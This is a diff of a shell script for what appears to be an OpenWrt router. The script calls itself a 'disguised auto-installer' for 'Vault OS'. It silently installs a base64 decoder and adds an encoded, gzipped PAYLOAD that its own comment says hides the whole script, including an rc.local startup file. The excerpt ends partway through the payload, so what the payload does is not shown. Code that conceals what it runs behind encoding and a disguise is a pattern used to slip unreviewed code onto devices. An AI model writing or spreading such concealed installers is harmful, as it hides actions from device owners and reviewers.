@@ -1,9 +1,19 @@
 #!/bin/sh
+# ===================================================================
+# ANONIMO'S VAULT OS - DISGUISED AUTO-INSTALLER
+# ===================================================================
 
 echo "====================================================="
 echo "  INITIALIZING VAULT OS ECOSYSTEM..."
 echo "====================================================="
 
+if ! command -v base64 >/dev/null 2>&1; then
+    echo "Installing decoding dependencies..."
+    opkg update >/dev/null 2>&1
+    opkg install coreutils-base64 >/dev/null 2>&1
+fi
+
+# Your entire script (including rc.local and vaultos_core.sh) is hidden here:
 PAYLOAD="H4sICBwmomoAA2luc3RhbGwuc2gAtVrbchu5EX3nV7RGjk0mnuHFomNLpHZpamSzliJV5GiVjXej
 Gs6AJKy5LQCKor16zAekKm9JVZ7yY/mCfEK6McPhxbR8DSWRQ6DR3WicBg4A7e+VRzwqy2lhH5pf
 /0ItrV6/1znrPxrCj62LrgP9IZjQ79lmu9tp/wCd3tBpdbv24BsZLDBvGoPxRY2NrDGgVx2n0+p2
